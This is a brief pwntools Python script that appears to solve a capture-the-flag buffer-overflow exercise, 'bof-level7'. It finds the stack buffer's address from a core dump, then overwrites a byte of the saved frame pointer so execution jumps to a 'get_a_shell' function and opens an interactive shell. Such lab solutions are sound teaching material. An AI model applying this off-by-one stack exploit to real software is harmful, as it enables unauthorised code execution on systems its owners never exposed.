#!/usr/bin/env python

from pwn import *

env = {
    'DUMMY': 'a'*128
}
p = process('./bof-level7', env = env)

e = ELF('./bof-level7')

get_a_shell = e.symbols['get_a_shell']

buf = p32(get_a_shell) * (136/4) + "\x00"

p.sendline(buf)
p.wait()
p.close()

core = Core('./core')

buffer_address = core.stack.find(buf)

print(hex(buffer_address))


p = process('./bof-level7', env = env)
buf = p32(get_a_shell) * (136/4) + "\x20"
p.sendline(buf)

p.interactive()
